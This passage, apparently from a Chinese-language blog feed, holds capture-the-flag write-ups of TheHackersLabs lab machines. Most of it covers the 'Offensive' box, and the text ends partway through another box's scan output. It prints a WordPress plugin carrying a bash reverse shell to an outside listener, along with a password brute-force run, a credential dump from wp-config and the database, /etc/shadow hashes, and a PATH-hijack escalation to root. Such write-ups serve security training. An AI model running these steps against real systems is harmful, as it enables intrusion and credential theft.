‚îî‚îÄ$ wpscan --url http://offensive.thl:80 -U administrator -P /usr/share/wordlists/rockyou.txt --api-token xxx   #api-tokenÊ≥®ÂÜåwpscanÂÆòÁΩëËé∑Âèñ
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ¬Æ
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://offensive.thl/ [192.168.205.220]
[+] Started: Wed Jan  1 13:23:14 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.62 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://offensive.thl/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://offensive.thl/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
 |  - http://offensive.thl/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;

[+] WordPress theme in use: gentlemens-club
 | Location: http://offensive.thl/wp-content/themes/gentlemens-club/
 | Latest Version: 1.0.0 (up to date)
 | Last Updated: 2024-09-25T00:00:00.000Z
 | Readme: http://offensive.thl/wp-content/themes/gentlemens-club/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://offensive.thl/wp-content/themes/gentlemens-club/style.css
 | Style Name: Gentlemen's Club
 | Description: Theme with a simple design, extremely linear and clean. A space reserved for the private club. The p...
 | Author: masino1967
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://offensive.thl/wp-content/themes/gentlemens-club/style.css, Match: 'Version: 1.0.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 &lt;========================================================&gt; (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
^Cying administrator / ripper Time: 00:01:13 &lt;                                                &gt; (9060 / 14344392)  0.06%  ETA: 32:11:33
[i] No Valid Passwords Found.

^Cying administrator / reyrey Time: 00:01:13 &lt;                                                &gt; (9063 / 14344392)  0.06%  ETA: 32:11:19
Scan Aborted: Canceled by User
                           
```

9000+ÈÉΩÁàÜÁ†¥‰∏çÂá∫Êù•ÔºåÈÇ£ÊÑèÊÄùÊòØÂú®‰ªÄ‰πàÂú∞ÊñπËóèÁùÄÔºü

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wget -r -np http://offensive.thl    
--2025-01-01 13:26:20--  http://offensive.thl/
Ê≠£Âú®Ëß£Êûê‰∏ªÊú∫ offensive.thl (offensive.thl)... 192.168.205.220
Ê≠£Âú®ËøûÊé• offensive.thl (offensive.thl)|192.168.205.220|:80... Â∑≤ËøûÊé•„ÄÇ
Â∑≤ÂèëÂá∫ HTTP ËØ∑Ê±ÇÔºåÊ≠£Âú®Á≠âÂæÖÂõûÂ∫î... 200 OK
ÈïøÂ∫¶ÔºöÊú™ÊåáÂÆö [text/html]
Ê≠£Âú®‰øùÂ≠òËá≥: ‚Äúoffensive.thl/index.html‚Äù

```

‰∏ãËΩΩ‰∫Ü‰∏Ä‰ªΩÁΩëÈ°µÊ≤°ÊúâÁªìÊûúÔºåÊàëËÆ∞ÂæóÂ•ΩÂÉèÈÇ£‰∏™APIÂèØ‰ª•‰∏ãËΩΩÊù•ÁùÄÔºå‰∏ãËΩΩ‰∏Ä‰ªΩ‰∏ãÊù•„ÄÇ

![image](https://github.com/user-attachments/assets/49ced356-5769-4985-b669-e50f078a45ab)

ÂÖàÂ∏ùÂàõ‰∏öÊú™ÂçäËÄå‰∏≠ÈÅìÂ¥©ÊÆÇÔºåmmpÔºåÈÇ£Ê≤°ÂäûÊ≥ï‰∫ÜÔºåÂ∞±Âú®Ëøô‰∏™APIÊé¢Á¥¢Âêß„ÄÇ

![image](https://github.com/user-attachments/assets/e2d52fcf-8201-41ec-9a5b-3c5551238f38)

Âú®`/image/`ÁõÆÂΩï‰∏ãÊâæÂà∞‰∏Ä‰∏™ÊúâÊÑèÊÄùÁöÑÂõæÁâá„ÄÇ

![image](https://github.com/user-attachments/assets/15bb561b-0c31-4141-8f36-47cfb5b579d7)

ÂïäËøô......Â±ûÂÆûÊòØÊñáÂåñËæìÂá∫‰∫ÜÔºåÂìàÂìàÂìà„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wget http://offensive.thl/images/wp-login.jpg                     
--2025-01-01 13:34:42--  http://offensive.thl/images/wp-login.jpg
Ê≠£Âú®Ëß£Êûê‰∏ªÊú∫ offensive.thl (offensive.thl)... 192.168.205.220
Ê≠£Âú®ËøûÊé• offensive.thl (offensive.thl)|192.168.205.220|:80... Â∑≤ËøûÊé•„ÄÇ
Â∑≤ÂèëÂá∫ HTTP ËØ∑Ê±ÇÔºåÊ≠£Âú®Á≠âÂæÖÂõûÂ∫î... 200 OK
ÈïøÂ∫¶Ôºö648072 (633K) [image/jpeg]
Ê≠£Âú®‰øùÂ≠òËá≥: ‚Äúwp-login.jpg‚Äù

wp-login.jpg                      100%[============================================================&gt;] 632.88K  --.-KB/s  Áî®Êó∂ 0.001s  

2025-01-01 13:34:42 (477 MB/s) - Â∑≤‰øùÂ≠ò ‚Äúwp-login.jpg‚Äù [648072/648072])

                                                                              
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ exiftool wp-login.jpg 
ExifTool Version Number         : 13.00
File Name                       : wp-login.jpg
Directory                       : .
File Size                       : 648 kB
File Modification Date/Time     : 2024:12:25 04:24:46+08:00
File Access Date/Time           : 2025:01:01 13:34:42+08:00
File Inode Change Date/Time     : 2025:01:01 13:34:42+08:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 3840
Image Height                    : 2160
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 3840x2160
Megapixels                      : 8.3
                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ stegseek wp-login.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: 'bestfriend'
[i] Original filename: 'wp-login.txt'.
[i] Extracting to 'wp-login.jpg.out'.

                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat wp-login.jpg.out
uFQ07kmjImx$)x9HHH3J3Sa5
                    
```

Áôª‰∏äÂéª‰∫ÜÔºåÊèêÊùÉÂ∞±ÁÆÄÂçï‰∫ÜÔºå‰º†‰∏™Plugins Shell‰∏äÂéª

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat wp_reverse.php 
&lt;?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec('/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'');
?&gt;
                         
```

ÂéãÊàêÂéãÁº©ÂåÖÂΩìÊèí‰ª∂‰º†‰∏äÂéªÂ∞±Â•Ω‰∫Ü„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888                         
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.220] 57678
bash: cannot set terminal process group (798): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TheHackersLabs-Offensive:/var/www/wordpress/wp-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

---

## 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑ÂèñÂèçÂêë shell ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ‰∫§‰∫íÂºè TTY shellÔºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

---

## 4.ÊèêÊùÉ

```bash
www-data@TheHackersLabs-Offensive:/tmp$ ss -ntlup
Netid                State                 Recv-Q                 Send-Q                                 Local Address:Port                                 Peer Address:Port                Process                                    
udp                  UNCONN                0                      0                                            0.0.0.0:68                                        0.0.0.0:*                                                              
tcp                  LISTEN                0                      4096                                         0.0.0.0:5000                                      0.0.0.0:*                                                              
tcp                  LISTEN                0                      511                                          0.0.0.0:8080                                      0.0.0.0:*                    users:(('node',pid=561,fd=18))            
tcp                  LISTEN                0                      128                                          0.0.0.0:22                                        0.0.0.0:*                                                              
tcp                  LISTEN                0                      80                                         127.0.0.1:3306                                      0.0.0.0:*                                                              
tcp                  LISTEN                0                      128                                             [::]:22                                           [::]:*                                                              
tcp                  LISTEN                0                      511                                                *:80                                              *:*                                                              

```

ÂºÄ‰∫Ü‰∏™3306,ÁúãÁúãÊúâ‰ªÄ‰πàÔºåËøôÂèØ‰ª•Êü•Âà∞‰ªñÁöÑmysqlÂØÜÁ†Å

```bash
www-data@TheHackersLabs-Offensive:/tmp$ cat /var/www/wordpress/wp-config.php 
&lt;?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to 'wp-config.php'
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wp_user' );

/** Database password */
define( 'DB_PASSWORD', 'wpManoloPass' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 *
 * At the installation time, database tables are created with the specified prefix.
 * Changing this value after WordPress is installed will make your site think
 * it has not been installed.
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/#table-prefix
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the 'stop editing' line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

Êü•ÁúãmysqlÊúâÊ≤°ÊúâÊïèÊÑü‰ø°ÊÅØ

```bash
MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.001 sec)

MariaDB [(none)]&gt; use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mysql]&gt; show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| column_stats              |
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| global_priv               |
| gtid_slave_pos            |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| index_stats               |
| innodb_index_stats        |
| innodb_table_stats        |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| roles_mapping             |
| servers                   |
| slow_log                  |
| table_stats               |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| transaction_registry      |
| user                      |
+---------------------------+

MariaDB [mysql]&gt; SELECT user, host, authentication_string FROM mysql.user;
+-------------+-----------+-------------------------------------------+
| User        | Host      | authentication_string                     |
+-------------+-----------+-------------------------------------------+
| mariadb.sys | localhost |                                           |
| root        | localhost | invalid                                   |
| mysql       | localhost | invalid                                   |
| wp_user     | localhost | *41D869A459C5FC17FE6786D4B639FE7FE528DCC2 |
+-------------+-----------+-------------------------------------------+
4 rows in set (0.001 sec)

MariaDB [wordpress]&gt; show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.000 sec)

MariaDB [wordpress]&gt; SELECT user_login, user_pass FROM wp_users;
+---------------+------------------------------------+
| user_login    | user_pass                          |
+---------------+------------------------------------+
| administrator | $P$BPzDdGMVlbK3gPYUUVtbvf0roz4rxX/ |
+---------------+------------------------------------+
1 row in set (0.000 sec)


```

‰∏ãÁè≠Ôºå‰ªÄ‰πàÈÉΩÊ≤°Êúâ„ÄÇÂÆûÂú®Êâæ‰∏çÂà∞Áî©‰∫Ü‰∏Ä‰∏™linpeas.shËøáÊù•,Ê≤°Êúâ‰ªÄ‰πàÊúâ‰ª∑ÂÄºÁöÑ‰∏úË•øÔºå‰ΩÜÊòØÊàëÂú®ÁúãlinpeasÊä•ÂëäÁöÑÊó∂ÂÄôÂÜçÁúã‰∫Ü‰∏ÄËæπÂºÄÊîæÁöÑÁ´ØÂè£ÂèëÁé∞5000Á´ØÂè£ÊòØÂºÄÊîæÁöÑÔºåËÄå‰∏îÊàënmapÊé¢ÊµãÊ≤°Êé¢ÊµãÂá∫Êù•ÔºåÂ∫îËØ•ÁéÑÊú∫Â∞±Âú®ËøôÈáåÔºåÂÖàËΩ¨ÂèëÂá∫ÂéªÂÖà

```bash
www-data@TheHackersLabs-Offensive:/tmp$ socat TCP-LISTEN:1234,fork TCP4:127.0.0.1:5000 &amp;
[1] 20694

```

![image](https://github.com/user-attachments/assets/df8f29f1-fe16-41a2-9bc6-66542f3465bb)

ÁàÜÁ†¥PIN,‰πüÂ∞±10000ÁßçÂèØËÉΩÔºàÂ¶ÇÊûú‰Ω†ÊòØÈÄöËøá‰ª£ÁêÜÁöÑÂΩ¢ÂºèËΩ¨ÂèëÁ´ØÂè£Â¶Ç:`chisel`ËøôÁßçÔºåÊàëÂª∫ËÆÆ‰Ω†Áõ¥Êé•ÊäÑÊàëÁöÑPINÔºåÂõ†‰∏∫‰ª£ÁêÜÂ∑®ÊÖ¢Ôºå‰∏çË¶ÅÈóÆ‰∏∫‰ªÄ‰πàÊàëÁü•ÈÅìÔºåÂõ†‰∏∫Êàë‰∏ÄÂºÄÂßãÂ∞±ÊòØËøôÊ†∑Âπ≤ÁöÑÔºâ

![image](https://github.com/user-attachments/assets/822a8467-e878-4a48-84a9-9f1c8fa38d1c)

PIN‰∏∫3333ÁöÑÊó∂ÂÄôÈïøÂ∫¶ÊòéÊòæ‰∏ç‰∏ÄÊ†∑ÔºåÊâÄ‰ª•Â∞±ÊòØ3333„ÄÇ

![image](https://github.com/user-attachments/assets/d46a4cc8-8700-4796-baa2-336f1cda0846)

ÂèØ‰ª•ÊâßË°åÂëΩ‰ª§ÔºåÂºπ‰∏™shellÂõûÊù•„ÄÇ

```bash
maria@TheHackersLabs-Offensive:~$ id
uid=1001(maria) gid=1001(maria) grupos=1001(maria)

```

Â∞ùËØïÊèêÊùÉ„ÄÇ

```bash
maria@TheHackersLabs-Offensive:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-Offensive: Nombre o servicio desconocido
[sudo] contrase√±a para maria: 
sudo: a password is required
maria@TheHackersLabs-Offensive:~$ ls -la
total 132
drwx------ 3 maria maria  4096 dic 31 05:35 .
drwxr-xr-x 3 root  root   4096 dic 29 15:41 ..
-rwsr-xr-x 1 root  root  16056 dic 26 10:22 app
-rw-r--r-- 1 maria maria    67 dic 26 11:20 backup.txt
-rw------- 1 maria maria    29 dic 29 15:41 .bash_history
-rw-r--r-- 1 maria maria   220 mar 29  2024 .bash_logout
-rw-r--r-- 1 maria maria  3526 mar 29  2024 .bashrc
-rw-r--r-- 1 maria maria 55646 dic  9  2021 GyMG.jpg
-rw-r--r-- 1 maria maria  4629 dic 27 10:14 index.php
-rw------- 1 maria maria    20 dic 26 11:59 .lesshst
drwxr-xr-x 3 maria maria  4096 dic 25 06:02 .local
-rw-r--r-- 1 maria maria   257 dic 25 18:46 logout.php
-rw-r--r-- 1 maria maria   807 mar 29  2024 .profile
-rw-r--r-- 1 maria maria    29 dic 31 05:35 user.txt
-rw-r--r-- 1 maria maria  4721 dic 27 07:47 welcome.php

```

Ëøô‰∏™appÊúâÁÇπÊÑèÊÄù„ÄÇ

```bash
maria@TheHackersLabs-Offensive:~$ strings app 
/lib64/ld-linux-x86-64.so.2
puts
setuid
system
__libc_start_main
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
[*] Mostrando las primeras 8 l
neas del archivo /etc/shadow 
/usr/bin/head -n 8 /etc/shadow
head -n 8 /etc/shadow
;*3$'
GCC: (Debian 12.2.0-14) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
app.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
_fini
system@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment

```

ÂÉèÊòØÊâßË°å‰∫Ü`head -n 8 /etc/shadow`ÔºåÊàë‰ª¨ÊâòÂéªIDA‰∏ÄÊé¢ÁúüÂÆπ„ÄÇ

![image](https://github.com/user-attachments/assets/b2985cc2-ac93-42bb-8b22-08668879ff48)

ÁåúÁöÑÊ≤°ÈîôÔºåÊàë‰ª¨ÂëΩ‰ª§Ê≥®ÂÖ•‰∏Ä‰∏ã„ÄÇ

```bash
maria@TheHackersLabs-Offensive:~$ echo 'chmod u+s /bin/bash' &gt; head
maria@TheHackersLabs-Offensive:~$ chmod +x head 
maria@TheHackersLabs-Offensive:~$ export PATH=/home/maria:$PATH
maria@TheHackersLabs-Offensive:~$ which head 
/home/maria/head
maria@TheHackersLabs-Offensive:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash
maria@TheHackersLabs-Offensive:~$ ./app


[*] Mostrando las primeras 8 l√≠neas del archivo /etc/shadow 

root:$y$j9T$2mXNTjVfEEjRt6t2uVu7k0$RBnftcaGot4JsJ8DHVuo0LkG8UuuKR68CdazrjK2Rf8:20088:0:99999:7:::
daemon:*:20066:0:99999:7:::
bin:*:20066:0:99999:7:::
sys:*:20066:0:99999:7:::
sync:*:20066:0:99999:7:::
games:*:20066:0:99999:7:::
man:*:20066:0:99999:7:::
lp:*:20066:0:99999:7:::


[*] Mostrando las primeras 8 l√≠neas del archivo /etc/shadow 

maria@TheHackersLabs-Offensive:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 mar 29  2024 /bin/bash
maria@TheHackersLabs-Offensive:~$ bash -p
bash-5.2# id
uid=1001(maria) gid=1001(maria) euid=0(root) grupos=1001(maria)

```

---

## 5.ÊÄªÁªì

ÂéªÁûÑ‰∫Ü`ll104567`Â§ß‰Ω¨ÁöÑwpÔºåÂèëÁé∞WordPressÈÇ£ÈáåÂèØ‰ª•‰ΩøÁî®**wpscan**Êâ´ÊèèÂÖ®ÈÉ®Êèí‰ª∂

```bash
wpscan --url http://192.168.205.213 -e ap,u --plugins-detection aggressive --api-token xxx
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_Offensive.html</guid><pubDate>Fri, 27 Jun 2025 09:33:56 +0000</pubDate></item><item><title>thl_ensala-papas</title><link>https://7r1UMPHK.github.io/post/thl_ensala-papas.html</link><description># thl_ensala-papas

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[thehackerslabs - ensala-papas](https://thehackerslabs.com/ensala-papas/)
**ÈöæÂ∫¶**ÔºöÂàùÂ≠¶ËÄÖ
**ÁõÆÊ†á IP**Ôºö192.168.205.221
**Êú¨Êú∫ IP**Ôºö192.168.205.141

---

# 1.Êâ´Êèè

`nmap`Ëµ∑ÊâãÔºåÂÖàÊé¢ÊµãÁ´ØÂè£

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:17 CST
Nmap scan report for 192.168.205.221
Host is up (0.00068s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
3167/tcp  filtered nowcontact
47001/tcp open     winrm
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 11.77 seconds
                                                                   
```

ÂÜçÊé¢ÊµãËØ¶ÁªÜÊúçÂä°

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sV -sT -O -Pn -n -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:19 CST
Nmap scan report for 192.168.205.221
Host is up (0.00046s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.00 seconds
                                                                
```

Êé¢ÊµãUDPÊúçÂä°

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sU -n -T4 --top-ports 100 192.168.205.221 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:27 CST
Nmap scan report for 192.168.205.221
Host is up (0.00048s latency).
Not shown: 62 closed udp ports (port-unreach), 37 open|filtered udp ports (no-response)
PORT    STATE SERVICE
137/udp open  netbios-ns
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 69.21 seconds
```

‰ΩøÁî®`nmap`Êâ´ÊèèÊºèÊ¥û

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap --script=vuln -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:24 CST
Nmap scan report for 192.168.205.221
Host is up (0.00056s latency).

PORT      STATE SERVICE
80/tcp    open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 148.15 seconds
                                              
```

ÁõÆÂâç‰∏∫Ê≠¢ÔºåÊÑüÂÖ¥Ë∂£ÁöÑÁ´ØÂè£Êúâ **80**„ÄÅ**445Ôºå**  windwosÁöÑÈù∂Êú∫445ÁöÑ‰ºòÂÖàÁ∫ßÈ´ò‰∫é80ÔºåÊâÄ‰ª•Êàë‰ª¨ÂÖàÊµãËØï445Á´ØÂè£ÊúâÊ≤°ÊúâÂà©Áî®ÁÇπ

---

# 2.Ë∏©ÁÇπ

## 2.1 port 445

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ netexec smb 192.168.205.221 -u guest -p '' --shares
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                            
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [-] WIN-4QU3QNHNK7E\guest: STATUS_LOGON_FAILURE 
                                                                                                    
```

ÂÆÉÊ≤°ÊúâÂºÄÊîæËÆøÂÆ¢ÁôªÂΩïÔºåÊâÄ‰ª•ÂèØ‰ª•Áõ¥Êé•ÂéªËßÇÂØü80Á´ØÂè£‰∫Ü

## 2.2 port 80

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.221 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x aspx,asp,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.221
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,html,txt,md,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*.aspx      (Status: 400) [Size: 20]
